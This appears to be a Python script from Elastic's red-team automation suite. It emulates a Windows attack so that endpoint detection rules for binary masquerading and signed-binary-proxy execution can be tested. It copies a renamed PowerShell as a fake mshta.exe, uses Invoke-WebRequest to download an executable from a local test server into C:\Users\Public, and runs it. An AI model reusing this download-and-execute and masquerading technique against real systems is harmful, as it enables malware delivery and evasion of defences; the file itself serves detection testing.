# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import common
from . import RtaMetadata


metadata = RtaMetadata(
    uuid="cbed76ce-a373-4bc5-b1b3-f5330de18cc7",
    platforms=["windows"],
    endpoint=[
        {"rule_name": "Execution from Unusual Directory", "rule_id": "16c84e67-e5e7-44ff-aefa-4d771bcafc0c"},
        {"rule_name": "Binary Masquerading via Untrusted Path", "rule_id": "35dedf0c-8db6-4d70-b2dc-a133b808211f"},
        {
            "rule_name": "Execution of a File Written by a Signed Binary Proxy",
            "rule_id": "ccbc4a79-3bae-4623-aaef-e28a96bf538b",
        },
        {
            "rule_name": "Script Execution via Microsoft HTML Application",
            "rule_id": "f0630213-c4c4-4898-9514-746395eb9962",
        },
        {
            "rule_name": "Suspicious Windows Script Interpreter Child Process",
            "rule_id": "83da4fac-563a-4af8-8f32-5a3797a9068e",
        },
    ],
    siem=[],
    techniques=["T1218", "T1036", "T1055", "T1105", "T1059"],
)

EXE_FILE = common.get_path("bin", "renamed_posh.exe")


@common.requires_os(metadata.platforms)
def main():
    server, ip, port = common.serve_web()
    url = f"http://{ip}:{port}/bin/renamed_posh.exe"

    mshta = "C:\\Users\\Public\\mshta.exe"
    dropped = "C:\\Users\\Public\\posh.exe"
    common.copy_file(EXE_FILE, mshta)

    cmd = f"Invoke-WebRequest -Uri {url} -OutFile {dropped}"

    # Execute command
    common.log("Using a fake mshta to drop and execute an .exe")
    common.execute([mshta, "/c", cmd], timeout=10)
    common.execute([mshta, "/c", dropped], timeout=10, kill=True)
    common.remove_file(mshta)
    common.remove_file(dropped)


if __name__ == "__main__":
    exit(main())
